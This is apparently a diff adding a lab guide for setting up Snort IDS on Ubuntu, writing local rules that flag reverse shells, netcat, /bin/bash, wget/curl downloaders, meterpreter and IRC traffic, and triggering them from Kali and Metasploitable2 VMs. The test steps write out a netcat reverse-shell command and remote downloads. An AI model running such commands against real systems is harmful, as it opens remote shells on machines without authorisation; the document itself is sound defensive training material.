@@ -1,0 +1,82 @@
+# STEP 1: CONFIGURE NETWORK
+# On all VMs (Ubuntu, Kali, Metasploitable2)
+ifconfig
+ping 192.168.45.135
+
+# STEP 2: INSTALL SNORT ON UBUNTU
+sudo apt update
+sudo apt install snort -y
+snort -V
+
+# STEP 3: CONFIGURE SNORT HOME_NET
+sudo nano /etc/snort/snort.conf
+# Set:
+# ipvar HOME_NET 192.168.45.0/24
+
+# STEP 4: ADD MALWARE SIGNATURE RULES
+sudo nano /etc/snort/rules/local.rules
+
+# Add the following rules:
+alert tcp any any -> $HOME_NET 4444 (msg:"MALWARE Reverse Shell Attempt Detected (Port 4444)"; sid:3000001; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Netcat Keyword Detected"; content:"nc "; nocase; sid:3000002; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Bash Shell Execution Pattern Detected"; content:"/bin/bash"; nocase; sid:3000003; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Downloader Command Detected (wget)"; content:"wget"; nocase; sid:3000004; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Downloader Command Detected (curl)"; content:"curl"; nocase; sid:3000005; rev:1;)
+alert tcp any any -> $HOME_NET 80 (msg:"MALWARE Possible EXE File Transfer Detected"; flow:to_client,established; content:".exe"; sid:3000006; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"MALWARE Meterpreter Payload Detected"; content:"meterpreter"; nocase; sid:3000007; rev:1;)
+alert tcp any any -> $HOME_NET 6667 (msg:"MALWARE Possible IRC Botnet Traffic"; sid:3000008; rev:1;)
+
+# STEP 5: TEST SNORT CONFIGURATION
+sudo snort -T -c /etc/snort/snort.conf
+
+# STEP 6: RUN SNORT IN IDS MODE
+ip link
+sudo snort -A console -q -c /etc/snort/snort.conf -i <interface_name>
+
+# STEP 7: GENERATE MALWARE-LIKE TRAFFIC
+
+# Test 1: Reverse Shell Simulation
+# Kali:
+nc -lvnp 4444
+# Metasploitable2:
+nc 192.168.45.135 4444 -e /bin/bash
+
+# Test 2: Netcat Keyword
+# Kali:
+nc -lvnp 1234
+# Metasploitable2:
+echo "nc test" | nc 192.168.45.135 1234
+
+# Test 3: /bin/bash
+# Kali:
+nc -lvnp 1234
+# Metasploitable2:
+echo "/bin/bash" | nc 192.168.45.135 1234
+
+# Test 4: Fake EXE Transfer
+# Kali:
+echo "fake malware file" > malware.exe
+python3 -m http.server 80
+# Metasploitable2:
+wget http://192.168.45.135/malware.exe
+
+# Test 5: Curl Downloader
+# Metasploitable2:
+curl http://192.168.45.135/malware.exe
+
+# Test 6: Meterpreter Keyword
+# Kali:
+nc -lvnp 1234
+# Metasploitable2:
+echo "meterpreter" | nc 192.168.45.135 1234
+
+# Test 7: IRC Botnet
+# Kali:
+nc -lvp 6667
+# Metasploitable2:
+nc 192.168.45.135 6667
+
+# STEP 8: VIEW ALERTS
+sudo cat /var/log/snort/alert
+sudo tail -f /var/log/snort/alert
+"""
